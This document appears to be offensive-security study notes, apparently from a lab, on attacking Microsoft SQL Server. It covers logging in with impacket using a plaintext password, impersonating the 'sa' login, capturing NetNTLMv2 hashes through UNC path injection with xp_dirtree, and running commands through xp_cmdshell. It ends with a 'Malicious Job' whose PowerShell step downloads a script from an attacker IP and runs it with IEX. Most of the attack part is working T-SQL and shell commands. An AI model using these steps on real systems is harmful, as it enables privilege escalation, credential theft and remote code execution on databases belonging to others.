```powershell
# connection
impacket-mssqlclient -windows-auth north.sevenkingdoms.local/jeor.mormont:'_L0ngCl@w_'@192.168.56.22 -windows-auth

# show databases;
SELECT name FROM sys.databases;

# the cuurent user:
SELECT SYSTEM_USER
```


> Note: The sa login is disabled by default when Windows Authentication Mode is selected during installation

---

## PrivEsc

### Impersonating Logins

MSSQL Server has a statement called EXECUTE AS which allows a login (or user) to switch the execution context of a session to another login (or user), essentially impersonating them until the context switch is explicitly switched back with the REVERT statement.

Which logins are allowed to impersonate which other logins is controlled by server-level IMPERSONATE permissions, stored in the sys.server_permissions table. We can enumerate all the logins our current login is allowed to impersonate with the following T-SQL query:
```powershell
SELECT name FROM sys.server_permissions JOIN sys.server_principals ON grantor_principal_id = principal_id WHERE permission_name = 'IMPERSONATE';

# after that we can impersonate by:
EXECUTE AS LOGIN = 'sa';
```


### UNC Path Injection
technique we will discuss is one which allows us to capture the NetNTLMv2 hash of whichever user the MSSQL Server service is running as. By default, the service runs as NT SERVICE\mssqlserver , but many database admins modify the service to run as a domain user so that it may interact with other servers, services, and resources in the domain.

In order to capture said hash, we need to make use of certain undocumented extended stored procedures . There are a number of these ( a, b, c) in MSSQL Server including: As an example, we can use xp_fileexist to check if the hosts file exists with the following T-SQL query:

xp_fileexist : Checks whether a certain file exists
xp_dirtree : Returns a directory tree based on a provided directory
xp_subdirs : Returns a list of sub-directories of a provided director

as an example:
```powershell
EXEC xp_fileexist 'C:\Windows\System32\drivers\etc\hosts';

File Exists   File is a Directory   Parent Directory Exists
-----------   -------------------   -----------------------
          1                     0                         1

```

so we can use something like:
```powershell
EXEC xp_dirtree '\\<IP>\a';
EXEC xp_subdirs '\\<IP>\a';
EXEC xp_fileexist '\\<IP>\a';
```
with responder to capture NTLM hash.

---

## Command Execution
we can do this:
By using the built-in `xp_cmdshell` extended stored procedure.
By creating a malicious MSSQL Server Agent Job.
By creating and executing an OLE Automation stored procedure.

> An extended stored procedure (ESP) is a SQL Server function implemented as a C/C++ dynamic-link library (DLL) that extends SQL Server's inherent capabilities by executing external code from within the SQL Server address space.


### xp_cmdshell

Two of the following techniques require advanced server configuration options to be enabled, which are disabled by default. To set an MSSQL Server configuration option, we use the `sp_configure` stored procedure. By default, advanced options are hidden, but a login with the sysadmin role may show them with the following T-SQL query. Note the RECONFIGURE statement, which actually updates the server configuration.
```powershell
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
```

Once enabled, we can use `xp_cmdshell` like any other stored procedure, and the output of the command will be returned to us in a table where each row is a new line.
```powershell
EXEC xp_cmdshell 'ipconfig';
```

### MSSQL Server Agent Job

another way to execute commands via `MSSQL` Server is by creating a malicious job for the `MSSQL` Server Agent . Jobs are comparable to scheduled tasks , and are intended to be used by database admins to automate tasks related to the database server.

microsoft provides the following example in their [documentation](https://learn.microsoft.com/en-us/ssms/agent/create-a-job?view=sql-server-ver16) for creating a job. In the T-SQL query below, a job called "Weekly Sales Data Backup" is defined, which runs a T- SQL query once at 23:30:00 

There are a handful of different subsystems which may be used when creating job steps . In the example above, we used the T-SQL subsystem, but there are also CmdExec and PowerShell subsystems which may be used to execute commands and PowerShell scripts respectively

For example, with the following T-SQL query, we can create a new job , with a step which uses the PowerShell subsystem to download and execute a script hosted on our own machine. Instead of defining a schedule like in the previous example, we can use the sp_start_job stored procedure to start the job immediately.
```sql
USE msdb;
GO
EXEC sp_add_job
@job_name = N'Malicious Job';
GO
EXEC sp_add_jobstep
@job_name = N'Malicious Job',
@step_name = N'Execute PowerShell Script',
@subsystem = N'PowerShell',
@command = N'(New-Object Net.WebClient).DownloadString("http://10.10.14.104/a")|IEX;',
@retry_attempts = 5,
@retry_interval = 5;
GO
EXEC sp_add_jobserver
@job_name = N'Malicious Job';
GO
EXEC sp_start_job
@job_name = N'Malicious Job';
GO
```